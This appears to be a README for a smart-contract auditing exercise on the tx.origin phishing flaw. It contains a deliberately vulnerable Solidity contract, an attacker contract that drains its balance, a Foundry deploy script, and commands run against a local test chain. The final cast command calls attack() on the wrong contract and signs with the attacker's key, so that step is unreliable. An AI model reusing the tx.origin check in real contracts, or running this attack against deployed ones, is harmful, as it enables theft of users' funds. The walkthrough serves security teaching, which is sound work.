# Web3eg-Smart-Contract-Auditor-Phishing-Attack
- The contract you've provided has a security vulnerability related to the use of tx.origin for authorization. This vulnerability can be exploited by an attacker to trick the owner into executing a malicious transaction. Below is an explanation of the vulnerability and how it can be exploited.
  ```solidity
  //SPDX-Liecence-Identifier: MIT
pragma solidity ^0.8.26;

contract Phishing {

    address public owner;

    constructor() payable {
        owner = msg.sender;

    }

    function transfer (address payable _to , uint _amount) public {
        require (tx.origin == owner , " you are not the owner");
        (bool sent , ) = _to.call{value: _amount}("");
        require(sent ,"fail");
    }
}
```
- Exploitation Scenario
1- Deploy the Phishing Contract: The attacker deploys the Phishing contract and funds it with some Ether.

2- Create a Malicious Contract: The attacker creates a malicious contract that calls the transfer function of the Phishing contract.

3- Trick the Owner: The attacker tricks the owner into interacting with the malicious contract. This could be done through social engineering, such as sending a phishing email or link that appears to be legitimate.

4- Execute the Attack: When the owner interacts with the malicious contract, it calls the transfer function of the Phishing contract. Since tx.origin is the owner's address, the require statement passes, and the funds are transferred to the attacker's address.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
    interface IPhishing{
        function transfer(address payable _to, uint _amount) external;
    }

    contract PhishingAttack {
        address public attacker;
        IPhishing public phishing;
        constructor (address _phishing) payable{
            attacker = payable(msg.sender);
            phishing = IPhishing((_phishing));
        }

        function attack() public{

        phishing.transfer(payable(attacker), address(phishing).balance);
        }
        receive() external payable {}

    }

```
- Deploy the Phishing Contract: Deploy the Phishing contract and fund it with Ether. and PhishingAttack contract
```solidity
//SPDX-Liecence-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Script.sol";
import "src/Phishing.sol";
import "src/PhishingAttack.sol";

contract DeployPhishing is Script{

    function run() external {

        uint256 privateKey1 =vm.envUint ("PRIVATE_KEY1");
        uint256 privateKey2 = vm.envUint("PRIVATE_KEY2");

        vm.startBroadcast(privateKey1);
        Phishing phishing = new Phishing{value : 10 ether}();
        vm.stopBroadcast();

        vm.startBroadcast(privateKey2);
        PhishingAttack phishingAttack = new PhishingAttack(address(phishing));
        vm.stopBroadcast();
    }

}
```
- command to deploy ``` forge script script/DeployPhishing.s.sol:DeployPhishing --rpc-url http://127.0.0.1:8545 --broadcast```
-  Trick the Owner: The attacker tricks the owner into interacting with the malicious contract. This could be done through social engineering, such as sending a phishing email or link that appears to be legitimate.

- Execute the Attack: When the owner interacts with the malicious contract, it calls the transfer function of the Phishing contract. Since tx.origin is the owner's address, the require statement passes, and the funds are transferred to the attacker's address.
  ```
```cast send < Phishing contract address> "attack()" --rpc-url http://127.0.0.1:8545 --private-key <private key PhishingAttack>
